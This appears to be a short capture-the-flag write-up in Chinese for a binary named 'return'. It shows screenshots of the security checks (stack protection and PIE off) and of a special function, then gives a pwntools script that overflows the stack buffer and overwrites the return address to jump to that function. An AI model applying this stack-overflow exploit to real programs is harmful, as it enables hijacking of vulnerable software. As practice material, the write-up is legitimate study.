首先查看安全選項
![image](https://user-images.githubusercontent.com/91378841/146903728-818a3688-f6e4-42f4-8e54-8dd633c7f32c.png)   
發現到Stack, PIE是關的
嘗試執行
![image](https://user-images.githubusercontent.com/91378841/146903667-27132cf7-5ae6-43a8-a55d-0c3af5a99edc.png)  
發現特別的function
![image](https://user-images.githubusercontent.com/91378841/146903970-358849cf-28dc-4e65-9253-c883e86310b4.png)   
![image](https://user-images.githubusercontent.com/91378841/146904478-b27b312f-c850-464a-852a-cd59dc895099.png)   
![image](https://user-images.githubusercontent.com/91378841/146904424-5cd12502-65dc-4218-b4c1-f7f0d07a2161.png)   
於是我們撰寫exploit code
```python
from pwn import *
context.arch = "amd64"
r = process("./return")
r.recvline()
r.sendline(b'a'*(0x30+8) + p64(0x4006b6))
r.interactive()  
```


